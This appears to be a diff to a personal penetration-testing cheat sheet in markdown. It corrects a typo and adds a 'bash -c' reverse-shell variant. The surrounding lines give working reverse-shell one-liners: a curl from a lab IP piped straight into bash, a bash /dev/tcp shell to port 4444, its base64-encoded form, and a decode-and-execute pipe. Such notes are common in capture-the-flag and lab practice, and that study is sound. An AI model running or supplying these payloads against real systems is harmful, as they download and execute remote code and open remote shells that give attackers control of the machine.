@@ -45,7 +45,7 @@ Download reverse shell file and imediately execute it
 
 	curl 'http://10.10.16.20:2020/test.sh'|bash
 
-Converte shell to base64 when sending it through http:
+Convert shell to base64 when sending it through http:
 
 	echo -n 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' | base64 -w 0
 	YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0IDA+JjE=
@@ -57,6 +57,8 @@ Converte shell to base64 when sending it through http:
 
 	Then when sending the payload do:
 	echo -n YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0ICAwPiYx | base64 -d | bash
+
+	Try something but with 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
 
 ## Resources
 
